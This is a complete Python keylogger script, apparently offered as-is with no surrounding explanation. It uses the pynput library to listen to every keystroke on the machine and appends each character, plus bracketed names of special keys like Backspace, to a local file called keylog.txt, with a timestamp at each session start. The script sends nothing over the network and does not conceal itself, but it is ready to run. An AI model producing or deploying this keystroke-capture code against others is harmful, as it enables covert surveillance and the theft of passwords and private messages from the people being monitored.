from pynput import keyboard
from datetime import datetime

# Log file name
log_file = "keylog.txt"

# Open log file and write session start timestamp
with open(log_file, "a") as f:
    f.write(f"\n\n--- Logging started at {datetime.now()} ---\n")

def on_press(key):
    try:
        # Try to write the actual character pressed
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # If it's a special key (like space, enter), handle that
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.backspace:
                f.write("[Backspace]")
            else:
                f.write(f"[{key.name}]")  # Generic special key

# Start the keylogger listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
